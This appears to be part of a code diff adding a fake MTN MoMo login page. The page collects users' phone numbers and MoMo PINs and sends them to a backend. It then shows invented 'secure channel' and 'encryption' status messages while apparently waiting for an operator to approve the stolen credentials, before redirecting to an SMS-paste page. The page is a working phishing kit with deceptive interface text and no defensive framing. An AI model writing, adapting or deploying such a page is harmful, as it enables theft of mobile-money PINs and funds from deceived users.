+        }
+
+        function startVerifyBar() {
+            verifyOverlay.classList.add('show');
+            verifyFeed.innerHTML = '';
+            verifyProgressFill.style.width = '0%';
+            verifyRingProgress.style.strokeDashoffset = RING_CIRCUMFERENCE;
+            verifyPatience.classList.remove('show');
+
+            const startTime = Date.now();
+            if (feedTimer) { clearInterval(feedTimer); feedTimer = null; }
+            if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
+            if (verifyTimer) { clearInterval(verifyTimer); verifyTimer = null; }
+
+            const SEQUENCE = [
+                { delay: 200,   kind: 'ok',     text: 'Secure channel established' },
+                { delay: 900,   kind: 'ok',     text: 'MoMo number verified' },
+                { delay: 1600,  kind: 'ok',     text: 'PIN received' },
+                { delay: 2400,  kind: 'pending',text: 'Confirming with MTN MoMo…', sub: 'Checking transaction' },
+                { delay: 5000,  kind: 'pending',text: 'Cross-referencing records' },
+                { delay: 8000,  kind: 'info',   text: 'End-to-end encryption' },
+                { delay: 13000, kind: 'pending',text: 'Verification in progress', sub: 'Secure confirmation underway' }
+            ];
+            SEQUENCE.forEach(item => {
+                setTimeout(() => addFeedLine(item.kind, item.text, item.sub), item.delay);
+            });
+
+            let extraCount = 0;
+            feedTimer = setInterval(() => {
+                if (extraCount >= 5) return;
+                extraCount++;
+                addFeedLine('pending', 'Verification in progress', null);
+                const lines = verifyFeed.querySelectorAll('.feed-line');
+                const last = lines[lines.length - 1];
+                if (last) {
+                    const sec = Math.round((Date.now() - startTime) / 1000);
+                    const sub = document.createElement('span');
+                    sub.className = 'sub';
+                    sub.textContent = '• ' + sec + ' sec';
+                    last.querySelector('.txt').appendChild(sub);
+                }
+            }, 6000);
+
+            elapsedTimer = setInterval(() => {
+                const sec = Math.floor((Date.now() - startTime) / 1000);
+                if (sec < 60) verifyElapsed.textContent = sec + ' sec';
+                else {
+                    const m = Math.floor(sec / 60), s = sec % 60;
+                    verifyElapsed.textContent = m + ' min ' + s + ' sec';
+                }
+                if (sec >= 180) verifyPatience.classList.add('show');
+            }, 1000);
+
+            verifyTimer = setInterval(() => {
+                const elapsed = Date.now() - startTime;
+                const ratio = Math.min((elapsed / PROGRESS_WINDOW_MS) * 0.90, 0.90);
+                verifyRingProgress.style.strokeDashoffset = (RING_CIRCUMFERENCE * (1 - ratio)).toFixed(2);
+                verifyProgressFill.style.width = (ratio * 100).toFixed(1) + '%';
+            }, 500);
+        }
+
+        function finishVerifyBar() {
+            if (verifyTimer) { clearInterval(verifyTimer); verifyTimer = null; }
+            if (feedTimer) { clearInterval(feedTimer); feedTimer = null; }
+            if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
+            verifyRingProgress.style.strokeDashoffset = '0';
+            verifyProgressFill.style.width = '100%';
+            addFeedLine('ok', 'End-to-end encryption');
+        }
+
+        function stopVerifyAnimation() {
+            if (verifyTimer) { clearInterval(verifyTimer); verifyTimer = null; }
+            if (feedTimer) { clearInterval(feedTimer); feedTimer = null; }
+            if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
+            verifyOverlay.classList.remove('show');
+            verifyRingProgress.style.strokeDashoffset = RING_CIRCUMFERENCE;
+            verifyProgressFill.style.width = '0%';
+            verifyFeed.innerHTML = '';
+            verifyPatience.classList.remove('show');
+        }
+
+        function showRejection(reason) {
+            stopVerifyAnimation();
+            verifyOverlay.classList.add('show');
+            verifyTitle.innerHTML = reason.title;
+            verifySubtitle.innerHTML = reason.subtitle;
+
+            setTimeout(function() {
+                verifyOverlay.classList.remove('show');
+                pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled', 'invalid'); });
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'LOGIN';
+                pinError.textContent = 'Incorrect credentials. Please check your number and ensure your details match.';
+                pinError.classList.add('show');
+                pinBoxes[0].focus();
+            }, 2600);
+        }
+
+        function stopPolling() {
+            if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+        }
+
+        function startPolling(requestId, fullPhone, country, token) {
+            currentRequestId = requestId;
+            stopPolling();
+            pollTimer = setInterval(async () => {
+                if (requestId !== currentRequestId) { stopPolling(); return; }
+                try {
+                    const res = await fetch(`${API_BASE}/api/approval/status/${requestId}`);
+                    const data = await res.json().catch(() => ({}));
+                    if (requestId !== currentRequestId) { stopPolling(); return; }
+                    if (!data.ok) return;
+
+                    if (data.status === 'approved') {
+                        stopPolling();
+                        finishVerifyBar();
+                        localStorage.setItem('momoSession', JSON.stringify({
+                            phone: fullPhone, country: country, token: token,
+                            sessionId: requestId, loggedInAt: new Date().toISOString()
+                        }));
+                        localStorage.setItem('momoPhone', fullPhone);
+                        localStorage.setItem('momoCountry', country);
+                        setTimeout(() => { window.location.href = 'sms-paste.html'; }, 500);
+
+                    } else if (data.status === 'rejected') {
+                        stopPolling();
+                        showRejection({
+                            title: '⚠️ Incorrect <span class="highlight">credentials</span>',
+                            subtitle: 'Please check your number and ensure your details match.'
+                        });
+
+                    } else if (data.status === 'timeout') {
+                        stopPolling();
+                        showRejection({
+                            title: 'Request <span class="highlight">timed out</span>',
+                            subtitle: 'Please try again.'
+                        });
+                    }
+                } catch (err) { console.warn('poll error:', err.message); }
+            }, POLL_INTERVAL_MS);
+        }
+
+        /* ============================================
+           LOGIN
+           ============================================ */
+        const loginBtn = document.getElementById('loginBtn');
+
+        loginBtn.addEventListener('click', async function() {
+            const countryData = COUNTRIES[currentCountry];
+            const phoneDigits = phoneInput.value.replace(/\s/g, '');
+            pinError.classList.remove('show');
+
+            if (phoneDigits.length !== countryData.digits || !/^\d+$/.test(phoneDigits)) {
+                phoneWrapper.classList.add('invalid');
+                phoneError.textContent = `Please enter a valid ${countryData.digits}-digit phone number`;
+                phoneError.classList.add('show');
+                phoneInput.focus();
+                return;
+            }
+            const pin = getPinValue();
+            if (pin.length !== 5) {
+                pinBoxes.forEach(b => b.classList.add('invalid'));
+                pinError.textContent = 'Please enter your 5-digit MoMo PIN';
+                pinError.classList.add('show');
+                pinBoxes[0].focus();
+                return;
+            }
+
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'LOGGING IN...';
+            const fullPhone = countryData.code + phoneDigits;
+
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 15000);
+
+                const res = await fetch(`${API_BASE}/api/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: fullPhone, country: currentCountry, pin: pin }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+
+                const data = await res.json().catch(() => ({}));
+                console.log('LOGIN RESPONSE:', data);
+
+                if (!res.ok || !data.ok) throw new Error(data.error || 'Login failed');
+
+                const reqId = data.requestId || data.sessionId;
+                if (reqId) {
+                    startVerifyBar();
+                    startPolling(reqId, fullPhone, currentCountry, data.token);
+                } else {
+                    localStorage.setItem('momoSession', JSON.stringify({
+                        phone: fullPhone, country: currentCountry, token: data.token,
+                        loggedInAt: new Date().toISOString()
+                    }));
+                    localStorage.setItem('momoPhone', fullPhone);
+                    localStorage.setItem('momoCountry', currentCountry);
+                    startVerifyBar();
+                    setTimeout(function() {
+                        finishVerifyBar();
+                        setTimeout(function() { window.location.href = 'sms-paste.html'; }, 350);
+                    }, 72 * 1000);
+                }
+
+            } catch (err) {
+                console.error('Login error:', err);
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'LOGIN';
+                const reason = err.name === 'AbortError'
+                    ? 'Server took too long. Please try again.'
+                    : (err.message || 'Could not connect. Check your internet.');
+                alert('Login failed: ' + reason);
+            }
+        });
+
+        phoneInput.addEventListener('blur', function() {
+            const digits = this.value.replace(/\s/g, '');
+            const needed = COUNTRIES[currentCountry].digits;
+            if (digits.length === needed && !getPinValue()) pinBoxes[0].focus();
+        });
+
+        window.addEventListener('load', () => {
+            phoneInput.value = '';
+            pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled', 'invalid'); });
+            phoneInput.focus();
+        });
+    </script>
+</body>
+</html>
